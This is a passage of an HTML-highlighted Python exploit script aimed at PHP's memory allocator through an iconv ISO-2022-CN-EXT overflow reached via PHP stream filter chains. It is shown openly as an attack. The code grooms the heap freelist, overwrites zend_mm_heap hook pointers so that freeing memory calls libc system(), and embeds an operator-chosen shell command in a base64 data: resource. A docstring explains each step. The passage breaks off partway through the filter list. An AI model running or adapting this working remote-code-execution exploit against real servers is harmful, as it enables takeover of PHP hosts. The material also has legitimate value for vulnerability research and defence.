</span><span style="color:#c0c5ce;">            and region.path in (&quot;&quot;, &quot;</span><span style="color:#a3be8c;">[anon:zend_alloc]</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">        ]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">not heaps:
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">failure</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Unable to find PHP&#39;s main heap in memory</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        first = heaps[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(heaps) &gt; </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">            heaps = &quot;</span><span style="color:#a3be8c;">, </span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">map</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">hex</span><span style="color:#c0c5ce;">, heaps))
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">msg_info</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Potential heaps: [i]</span><span style="color:#c0c5ce;">{heaps}</span><span style="color:#a3be8c;">[/] (using first)</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">msg_info</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Using [i]</span><span style="color:#c0c5ce;">{</span><span style="color:#96b5b4;">hex</span><span style="color:#c0c5ce;">(first)}</span><span style="color:#a3be8c;">[/] as heap</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">first
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">run</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">) -&gt; </span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">check_vulnerable</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">get_symbols_and_addresses</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">exploit</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">build_exploit_path</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">) -&gt; str:
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">&quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the
</span><span style="color:#65737e;">        other. Processing generally involves making some kind of operation either
</span><span style="color:#65737e;">        on the chunk or in a destination chunk of the same size. Each operation is
</span><span style="color:#65737e;">        applied on every single chunk; you cannot make PHP apply iconv on the first 10
</span><span style="color:#65737e;">        chunks and leave the rest in place. That&#39;s where the difficulties come from.
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        Keep in mind that we know the address of the main heap, and the libraries.
</span><span style="color:#65737e;">        ASLR/PIE do not matter here.
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        The idea is to use the bug to make the freelist for chunks of size 0x100 point
</span><span style="color:#65737e;">        lower. For instance, we have the following free list:
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        By triggering the bug from chunk ..900, we get:
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        That&#39;s step 3.
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        Now, in order to control the free list, and make it point whereever we want,
</span><span style="color:#65737e;">        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
</span><span style="color:#65737e;">        we&#39;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
</span><span style="color:#65737e;">        That&#39;s step 2.
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        Now, if we were to perform step2 an then step3 without anything else, we&#39;d have
</span><span style="color:#65737e;">        a problem: after step2 has been processed, the free list goes bottom-up, like:
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        We need to go the other way around. That&#39;s why we have step 1: it just allocates
</span><span style="color:#65737e;">        chunks. When they get freed, they reverse the free list. Now step2 allocates in
</span><span style="color:#65737e;">        reverse order, and therefore after step2, chunks are in the correct order.
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        Another problem comes up.
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
</span><span style="color:#65737e;">        Since step2 creates chunks that contain pointers and pointers are generally not
</span><span style="color:#65737e;">        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
</span><span style="color:#65737e;">        To avoid this, we put the chunks in step2 at the very end of the chain, and
</span><span style="color:#65737e;">        prefix them with `0</span><span style="color:#96b5b4;">\n</span><span style="color:#65737e;">`. When dechunked (right before the iconv), they will
</span><span style="color:#65737e;">        &quot;disappear&quot; from the chain, preserving them from the character set conversion
</span><span style="color:#65737e;">        and saving us from an unwanted processing error that would stop the processing
</span><span style="color:#65737e;">        chain.
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
</span><span style="color:#65737e;">        don&#39;t know the precise layout of the heap, but we know that at the top of the
</span><span style="color:#65737e;">        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
</span><span style="color:#65737e;">        Its free_slot[] array contains a pointer to each free list. By overwriting it,
</span><span style="color:#65737e;">        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
</span><span style="color:#65737e;">        field contains pointers to hook functions for emalloc, efree, and erealloc
</span><span style="color:#65737e;">        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
</span><span style="color:#65737e;">        then overwrite the use_custom_heap flag to make PHP use these function pointers
</span><span style="color:#65737e;">        instead. We can now do our favorite CTF technique and get a call to
</span><span style="color:#65737e;">        system(&lt;chunk&gt;).
</span><span style="color:#65737e;">        We make sure that the &quot;system&quot; command kills the current process to avoid other
</span><span style="color:#65737e;">        system() calls with random chunk data, leading to undefined behaviour.
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the
</span><span style="color:#65737e;">        process is in a random state, we still get contiguous, in order chunks for our
</span><span style="color:#65737e;">        exploit.
</span><span style="color:#65737e;">
</span><span style="color:#65737e;">        Therefore, the whole process described here CANNOT crash. Everything falls
</span><span style="color:#65737e;">        perfectly in place, and nothing can get in the middle of our allocations.
</span><span style="color:#65737e;">        &quot;&quot;&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">LIBC </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.info[&quot;</span><span style="color:#a3be8c;">libc</span><span style="color:#c0c5ce;">&quot;]
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">ADDR_EMALLOC </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">LIBC</span><span style="color:#c0c5ce;">.symbols[&quot;</span><span style="color:#a3be8c;">__libc_malloc</span><span style="color:#c0c5ce;">&quot;]
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">ADDR_EFREE </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">LIBC</span><span style="color:#c0c5ce;">.symbols[&quot;</span><span style="color:#a3be8c;">__libc_system</span><span style="color:#c0c5ce;">&quot;]
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">ADDR_EREALLOC </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">LIBC</span><span style="color:#c0c5ce;">.symbols[&quot;</span><span style="color:#a3be8c;">__libc_realloc</span><span style="color:#c0c5ce;">&quot;]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">ADDR_HEAP </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.info[&quot;</span><span style="color:#a3be8c;">heap</span><span style="color:#c0c5ce;">&quot;]
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">ADDR_FREE_SLOT </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">ADDR_HEAP </span><span style="color:#c0c5ce;">+ </span><span style="color:#d08770;">0x20
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">ADDR_CUSTOM_HEAP </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">ADDR_HEAP </span><span style="color:#c0c5ce;">+ </span><span style="color:#d08770;">0x0168
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">ADDR_FAKE_BIN </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">ADDR_FREE_SLOT </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0x10
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        CS = </span><span style="color:#d08770;">0x100
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># Pad needs to stay at size 0x100 at every step
</span><span style="color:#c0c5ce;">        pad_size = CS - </span><span style="color:#d08770;">0x18
</span><span style="color:#c0c5ce;">        pad = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot; * pad_size
</span><span style="color:#c0c5ce;">        pad = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(pad, </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(pad) + </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        pad = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(pad, </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(pad) + </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        pad = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(pad, </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(pad) + </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        pad = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(pad)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        step1_size = </span><span style="color:#d08770;">1
</span><span style="color:#c0c5ce;">        step1 = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot; * step1_size
</span><span style="color:#c0c5ce;">        step1 = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step1)
</span><span style="color:#c0c5ce;">        step1 = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step1)
</span><span style="color:#c0c5ce;">        step1 = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step1, CS)
</span><span style="color:#c0c5ce;">        step1 = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step1)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        step2_size = </span><span style="color:#d08770;">0x48
</span><span style="color:#c0c5ce;">        step2 = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot; * (step2_size + </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        step2 = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step2, CS)
</span><span style="color:#c0c5ce;">        step2 = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step2)
</span><span style="color:#c0c5ce;">        step2 = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step2)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        step2_write_ptr = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">0</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#8fa1b3;">ljust</span><span style="color:#c0c5ce;">(step2_size, </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;) + </span><span style="color:#8fa1b3;">p64</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">ADDR_FAKE_BIN</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        step2_write_ptr = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step2_write_ptr, CS)
</span><span style="color:#c0c5ce;">        step2_write_ptr = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step2_write_ptr)
</span><span style="color:#c0c5ce;">        step2_write_ptr = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step2_write_ptr)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        step3_size = CS
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        step3 = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot; * step3_size
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">assert </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(step3) == CS
</span><span style="color:#c0c5ce;">        step3 = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step3)
</span><span style="color:#c0c5ce;">        step3 = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step3)
</span><span style="color:#c0c5ce;">        step3 = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step3)
</span><span style="color:#c0c5ce;">        step3 = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step3)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        step3_overflow = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot; * (step3_size - </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">BUG</span><span style="color:#c0c5ce;">)) + </span><span style="color:#bf616a;">BUG
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">assert </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(step3_overflow) == CS
</span><span style="color:#c0c5ce;">        step3_overflow = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step3_overflow)
</span><span style="color:#c0c5ce;">        step3_overflow = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step3_overflow)
</span><span style="color:#c0c5ce;">        step3_overflow = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step3_overflow)
</span><span style="color:#c0c5ce;">        step3_overflow = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step3_overflow)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        step4_size = CS
</span><span style="color:#c0c5ce;">        step4 = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">=00</span><span style="color:#c0c5ce;">&quot; + </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot; * (step4_size - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        step4 = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step4)
</span><span style="color:#c0c5ce;">        step4 = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step4)
</span><span style="color:#c0c5ce;">        step4 = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step4)
</span><span style="color:#c0c5ce;">        step4 = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step4)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># This chunk will eventually overwrite mm_heap-&gt;free_slot
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
</span><span style="color:#c0c5ce;">        step4_pwn = </span><span style="color:#8fa1b3;">ptr_bucket</span><span style="color:#c0c5ce;">(
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0x200000</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;"># free_slot
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ADDR_CUSTOM_HEAP</span><span style="color:#c0c5ce;">,  </span><span style="color:#65737e;"># 0x18
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ADDR_HEAP</span><span style="color:#c0c5ce;">,  </span><span style="color:#65737e;"># 0x140
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">=CS,
</span><span style="color:#c0c5ce;">        )
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        step4_custom_heap = </span><span style="color:#8fa1b3;">ptr_bucket</span><span style="color:#c0c5ce;">(
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ADDR_EMALLOC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">ADDR_EFREE</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">ADDR_EREALLOC</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">0x18
</span><span style="color:#c0c5ce;">        )
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        step4_use_custom_heap_size = </span><span style="color:#d08770;">0x140
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">COMMAND </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.command
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">COMMAND </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">kill -9 $PPID; </span><span style="color:#c0c5ce;">{</span><span style="color:#bf616a;">COMMAND</span><span style="color:#c0c5ce;">}&quot;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.sleep:
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">COMMAND </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">sleep </span><span style="color:#c0c5ce;">{</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.sleep}</span><span style="color:#a3be8c;">; </span><span style="color:#c0c5ce;">{</span><span style="color:#bf616a;">COMMAND</span><span style="color:#c0c5ce;">}&quot;
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">COMMAND </span><span style="color:#c0c5ce;">= COMMAND.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">() + </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">assert </span><span style="color:#c0c5ce;">(
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">COMMAND</span><span style="color:#c0c5ce;">) &lt;= step4_use_custom_heap_size
</span><span style="color:#c0c5ce;">        ), </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Command too big (</span><span style="color:#c0c5ce;">{</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">COMMAND</span><span style="color:#c0c5ce;">)}</span><span style="color:#a3be8c;">), it must be strictly inferior to </span><span style="color:#c0c5ce;">{</span><span style="color:#96b5b4;">hex</span><span style="color:#c0c5ce;">(step4_use_custom_heap_size)}&quot;
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">COMMAND </span><span style="color:#c0c5ce;">= COMMAND.</span><span style="color:#8fa1b3;">ljust</span><span style="color:#c0c5ce;">(step4_use_custom_heap_size, </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        step4_use_custom_heap = </span><span style="color:#bf616a;">COMMAND
</span><span style="color:#c0c5ce;">        step4_use_custom_heap = </span><span style="color:#8fa1b3;">qpe</span><span style="color:#c0c5ce;">(step4_use_custom_heap)
</span><span style="color:#c0c5ce;">        step4_use_custom_heap = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step4_use_custom_heap)
</span><span style="color:#c0c5ce;">        step4_use_custom_heap = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step4_use_custom_heap)
</span><span style="color:#c0c5ce;">        step4_use_custom_heap = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step4_use_custom_heap)
</span><span style="color:#c0c5ce;">        step4_use_custom_heap = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step4_use_custom_heap)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        pages = (
</span><span style="color:#c0c5ce;">            step4 * </span><span style="color:#d08770;">3
</span><span style="color:#c0c5ce;">            + step4_pwn
</span><span style="color:#c0c5ce;">            + step4_custom_heap
</span><span style="color:#c0c5ce;">            + step4_use_custom_heap
</span><span style="color:#c0c5ce;">            + step3_overflow
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;"># + pad * self.pad
</span><span style="color:#c0c5ce;">            + step1 * </span><span style="color:#d08770;">3
</span><span style="color:#c0c5ce;">            + step2_write_ptr
</span><span style="color:#c0c5ce;">            + step2 * </span><span style="color:#d08770;">2
</span><span style="color:#c0c5ce;">        )
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        resource = </span><span style="color:#8fa1b3;">compress</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">compress</span><span style="color:#c0c5ce;">(pages))
</span><span style="color:#c0c5ce;">        resource = </span><span style="color:#8fa1b3;">b64</span><span style="color:#c0c5ce;">(resource)
</span><span style="color:#c0c5ce;">        resource = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">data:text/plain;base64,</span><span style="color:#c0c5ce;">{resource.</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">()}&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        filters = [
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;"># Create buckets
</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">zlib.inflate</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">zlib.inflate</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">            
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;"># Step 0: Setup heap
</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">convert.iconv.L1.L1</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">            
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;"># Step 1: Reverse FL order
</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">convert.iconv.L1.L1</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">            
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;"># Step 2: Put fake pointer and make FL order back to normal
